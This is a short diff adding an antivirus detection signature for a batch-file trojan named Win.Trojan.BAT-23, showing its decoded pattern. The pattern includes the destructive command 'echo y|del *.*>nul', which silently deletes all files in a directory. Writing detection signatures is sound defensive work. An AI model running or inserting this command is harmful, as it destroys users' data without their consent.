@@ -1,0 +1,6 @@
+VIRUS NAME: Win.Trojan.BAT-23
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+@echo XII-ET 585668 Bath Killer ....
+echo y|del *.*>nul
